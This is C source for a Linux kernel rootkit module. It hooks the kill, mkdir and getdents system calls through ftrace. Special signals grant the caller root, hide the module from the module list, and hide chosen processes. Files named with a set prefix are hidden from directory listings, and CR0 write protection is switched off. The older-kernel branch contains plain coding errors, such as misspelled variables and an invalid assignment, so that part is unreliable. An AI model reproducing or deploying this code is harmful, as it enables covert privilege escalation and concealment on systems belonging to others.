#include <linux/init.h>             //must have to make a kernal module
#include <linux/module.h>           //must have to make a kernal module
#include <linux/kernel.h>           //to ger kernal methods
#include <linux/syscalls.h>         // to get syscalltable
#include <linux/kallsyms.h>         //also to get acces to kallsysm_lookup_name
#include <linux/kprobes.h>          //work around for kernal 5.6.0 and above
#include <linux/unistd.h>           // contains syscall numbers
#include <linux/version.h>          // linux kernel versions 
#include <linux/dirent.h>	        //contains dirent structs etc

#include "headers/ftrace_helper.h"          //helps with setting the hooked functions bach to default

MODULE_LICENSE("GPL");
MODULE_AUTHOR("infernexio");
MODULE_DESCRIPTION("rootkit");
MODULE_VERSION("0.0.1");


enum signals{
    SIGSUPER = 64, // become root
    SIGINVIS = 63, // hide the rootkit
    SIGHIDE = 62,  // hide process with pid given
};

unsigned long *__sys_call_table = NULL;
static short hidden = 0;
static struct list_head *prev_module;
char hide_pid[NAME_MAX];
#define PREFIX "SOHAIL"

#ifdef CONFIG_X86_64
/* on 64-bit x86 and kernel v4.17 syscalls are nolonger
 allowed to be called form the kernel*/
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
#define PTREGS_SYSCALL_STUB 1
/* kill */
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
static ptregs_t orig_kill;
/* mkdir */
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *);
static ptregs_t orig_mkdir;
/* ls 64-bit*/
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *);
static ptregs_t orig_getdents64;
/* ls 32-bit */
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *);
static ptregs_t orig_getdents;
#else
/* kill */
typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);
static orig_kill_t orig_kill;
/* mkdir */
typedef asmlinkage long(*orig_mkdir_t)(const char __user *pathname, umode_t mode);
static orig_mkdir_t orig_mkdir;
/* ls 64-bit */
typedef asmlinkage long (*orig_getdents64_t)(unsigned int fd, struct linux_dirent64 *dirent, unsigned intcount);
static orig_getdents64_t orig_getdents64;
/* ls 32-bit */
typedef asmlinkage long (*orig_getdents_t)(unsigned int fd, struct linux_dirent *dirent, unsigned intcount);
static orig_getdents_t orig_getdents;
#endif
#endif


#if PTREGS_SYSCALL_STUB
/**
 * if signal is 64 then gives the current user root privilegs
 * if signale is 63 hides the rootkit
 * kill
*/
static asmlinkage long hook_kill(const struct pt_regs *regs){
    int sig = regs->si;
    pid_t pid = regs->di;

    void set_root(void);
    void hide_me(void);
    void show_me(void);

    if(sig == SIGSUPER){
        printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root privilges\n", sig, SIGSUPER);
        set_root();
        return 0;
    }else if((sig == SIGINVIS) && (hidden == 0)){
        printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit\n", sig, SIGINVIS);
        hide_me();
        hidden = 1;
        return 0;
    }else if((sig == SIGINVIS) && (hidden == 1)){
        /* This is only for testing we don't want anyone to get rid of our rootkit */
        printk(KERN_INFO "signal: %d == SIGINVIS %d | reavling the rootkit\n", sig, SIGINVIS);
        show_me();
        hidden = 0;
        return 0;
    }else if((sig == SIGHIDE)){
        printk(KERN_INFO "rootkit: hiding process with id %d\n",pid);
        sprintf(hide_pid, "%d", pid);
        return 0;
    }

    printk(KERN_INFO "***** hacked kill syscall *****\n");

    return orig_kill(regs);
}

/**
 * sending any directory created to the dmesg logs
 * mkdir
*/
static asmlinkage int hook_mkdir(const struct pt_regs *regs){
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if(error > 0){
        printk(KERN_INFO "rootkit: trying to create directory with name : %s\n", dir_name);
    }
    printk(KERN_INFO "***** hacked mkdir syscall *****\n");

    orig_mkdir(regs);
    return 0;
}

/**
 * hiding directories and files with the PREFIX
 * getdents64
*/
static asmlinkage long hook_getdents64(const struct pt_regs *regs){
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    long error;
    unsigned long index = 0;

    // get real output with all files in a directory
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if((ret <=0) || (dirent_ker == NULL)){
        return ret;
    }

    error = copy_from_user(dirent_ker, dirent, ret);
    if(error){
        goto done;
    }
    
    //loop through the directory to find the prefix
    while(index < ret){
        //looking at the first index.
        current_dir = (void *)dirent_ker + index;

        //checking if the file at the current directory has the prefix
        // or if the process id is equal to the one we want to hide
        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 || 
            ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) !=0))){
            // if the prefix is the first index of the list we have to move everything up
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            // we add the length of teh current directory to the previous one
            previous_dir->d_reclen += current_dir->d_reclen;
        }else{
            previous_dir = current_dir;
        }
        index += current_dir->d_reclen;
    }
    
    // return altered list to user
    error = copy_to_user(dirent, dirent_ker, ret);
    if(error){
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;

}

/**
 * hiding directories and files with the PREFIX
 * getdents
*/
static asmlinkage long hook_getdents(const struct pt_regs *regs){
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };


    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    long error;
    unsigned long index = 0;

    // get real output with all files in a directory
    int ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if((ret <=0) || (dirent_ker == NULL)){
        return ret;
    }

    error = copy_from_user(dirent_ker, dirent, ret);
    if(error){
        goto done;
    }
    
    //loop through the directory to find the prefix
    while(index < ret){
        //looking at the first index.
        current_dir = (void *)dirent_ker + index;

        //checking if the file at the current directory has the prefix
        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 || 
            ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) !=0))){
            // if the prefix is the first index of the list we have to move everything up
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            // we add the length of teh current directory to the previous one
            previous_dir->d_reclen += current_dir->d_reclen;
        }else{
            previous_dir = current_dir;
        }
        index += current_dir->d_reclen;
    }
    
    // return altered list to user
    error = copy_to_user(dirent, dirent_ker, ret);
    if(error){
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;

}
#else
/**
 * if signal is 64 then gives the current user root privilegs
 * if signale is 63 hides the rootkit
 * kill
*/
static asmlinkage long hook_kill(pid_t pid, int sig){
	void set_root(void);
    void hide_me(void);
    void show_me(void);
    
    if(sig == SIGSUPER){
        printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root priveliges\n", sig, SIGSUPER);
        set_root();
        return 0;
    }else if((sig == SIGINVIS) && (hidden == 0)){
        printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit\n", sig, SIGINVIS);
        hide_me();
        hidden = 1;
        return 0;
    }else if((sig == SIGINVIS) && (hidden == 1)){
        /* This is only for testing we don't want anyone to get rid of our rootkit */
        printk(KERN_INFO "signal: %d == SIGINVIS %d | reavling the rootkit\n", sig, SIGINVIS);
        show_me();
        hidden = 0;
        return 0;
    }else if((sig == SIGHIDE)){
        printk(KERN_INFO "rootkit: hiding process with id %d\n",pid);
        sprintf(hide_pid, "%d", pid);
        return 0;
    }
    
    printk(KERN_INFO "***** hacked kill syscall *****\n");

    return orig_kill(regs);
}

/**
 * sending any directory created to the dmesg logs
 * mkdir
*/
static asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode){

    char dir_name[NAME_MAX] = {0};

    long error =  strncpy_from_user(dir_name, pathname, NAME_MAX);

    if(error > 0){
        printk(KERN_INFO "rootkit: trying to create directory with name : %s\n", dir_name);
    }
    printk(KERN_INFO "***** hacked mkdir syscall *****\n");

    orig_mkdir(pathname, mode);
    return 0;
}

/**
 * hiding directories and files with the PREFIX
 * getdents64
*/
static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count){
    struct linux_dirent64 *current_dir, *previous_dir = NULL;
    unsigned long index = 0;
    long error;
    
    //getting actuall output of the dirr
    int ret = orig_getdents64(fd,dirent,count);
    dirent_ket = kzalloc(ret, GFP_KERNEL);
    if((ret <=0) || (dirent_ker == NULL)){
        return ret;
    }

    error = copy_from_user(dirent_ker, dirent, ret);
    if(error){
        goto done;
    }

    //looping thorugh the list to find the prefix and then remove those instances
    while(index < ret){
        current_dir = (void *) dirent_ker = 0;

        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) ==0 || 
            ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) !=0))){
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen,ret);
                continue;
            }
        }else{
            previous_dir = current_dir;
        }
        index += current_dir->d_reclen;
    }

    error = copy_to_user(dirent,dirent_ker, ret);
    if(error){
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;
}

/**
 * hiding directories and files with the PREFIX
 * getdents
*/
static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count){
    struct linux_dirent{
        unsigned long d_ino;
        unsigned long d_off;
        unsigned long d_reclen;
        char d_name[];
    }

    struct linux_dirent *current_dir, *previous_dir = NULL;
    unsigned long index = 0;
    long error;
    
    //getting actuall output of the dirr
    int ret = orig_getdents(fd,dirent,count);
    dirent_ket = kzalloc(ret, GFP_KERNEL);
    if((ret <=0) || (dirent_ker == NULL)){
        return ret;
    }

    error = copy_from_user(dirent_ker, dirent, ret);
    if(error){
        goto done;
    }

    //looping thorugh the list to find the prefix and then remove those instances
    while(index < ret){
        current_dir = (void *) dirent_ker = 0;

        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) ==0 || 
            ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) !=0))){
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen,ret);
                continue;
            }
        }else{
            previous_dir = current_dir;
        }
        index += current_dir->d_reclen;
    }

    error = copy_to_user(dirent,dirent_ker, ret);
    if(error){
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;
}
#endif

void hide_me(void){
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void show_me(void){
    list_add(&THIS_MODULE->list, prev_module);
}

/**
 * changes the credentials of the given user to be root
*/
void set_root(void){
    struct cred *root;
    root = prepare_creds();

    if( root == NULL){
        return;
    }

    root->uid.val = root->gid.val = 0;
    root->euid.val = root-> egid.val =0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}

/**
 * Custom write_cr0 function to unprotect memory
 * this gets past the checks that the write_cr0 has
 */
static inline void write_cr0_forced(unsigned long val){
    unsigned long __force_order;

    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

/**
 * Disables write protection
*/
static void unprotect_memory(void){
    write_cr0_forced(read_cr0() & (~ 0x10000));
    printk(KERN_INFO "unportected memory\n");
}


/**
 * enables memory protection
*/
static void protect_memory(void){
    write_cr0_forced(read_cr0() | (0x10000));
    printk(KERN_INFO "protected memory\n");
}

// /**
//  * checks kernel version and gets address of syscall table
//  * @return - returns the memory adress of the syscall table
// */
// static unsigned long *get_syscall_table(void){
//     unsigned long *syscall_table;

// #if LINUX_VERSION_CODE < KERNEL_VERSION(6,0,0)
//         syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
// #else
//         syscall_table = NULL;
// #endif

// 	//printk(KERN_INFO "syscaltable value: %ln",syscall_table);
//     return syscall_table;
// }

/**
 * array of functins hooked by this rootkit
*/
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
    HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
};

/**
 * start of the rootkit
 * like the main method
*/
static int __init init_func(void){
    int err;
    unprotect_memory();
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));

    if(err){
        return err;
    }
    
    printk(KERN_INFO "rootkit: initalized\n");

    //__sys_call_table = get_syscall_table();

    // if(!__sys_call_table){
    //     printk(KERN_INFO "error: unable to gain syscal table\n");
    //     return err;
    // }

    // if(store() == err){
    //     printk(KERN_INFO "error:store error\n");
    // }

    // if(hook() == err){
    //     printk(KERN_INFO "error: hook error\n");
    // }

    protect_memory();

    return 0;
}

/**
 * exit of the rootkit
*/
static void __exit exit_func(void){
    printk(KERN_INFO "rootkit: stoped\n");

    unprotect_memory();

    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

    // if(cleanup() == err){
    //     printk(KERN_INFO "error: clean up error\n");
    // }

    protect_memory();
}

/**
 * sets the init and exit methods
*/
module_init(init_func);
module_exit(exit_func);


//Older way to do the cleanup and hooking the ftrace functions are much easier
/**
 * for clearn up after the syscall
*/
// static int cleanup(void){
//     /* kill */
//     __sys_call_table[__NR_kill] = (unsigned long)orig_kill;

//     return 0;
// }

/**
 * stores the id of the sys call to later hook
*/
// static int store(void){
// /* if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0) syscall use pt_regs stub*/
// #if PTREGS_SYSCALL_STUB
//     /* kill */
//     orig_kill = (ptregs_t)__sys_call_table[__NR_kill];
//     printk(KERN_INFO "orig_kill table entry successfully sotred\n");

// /* if LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0) */
// #else
//     /* kill */
//     orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
//     printk(KERN_INFO "orig_kill table entry successfully sotred\n");
// #endif

//     return 0;
    
// }

// static int hook(void){
//     /* kill */
//     __sys_call_table[__NR_kill] = (unsigned long)&hacked_kill;
//     return 0;
// }
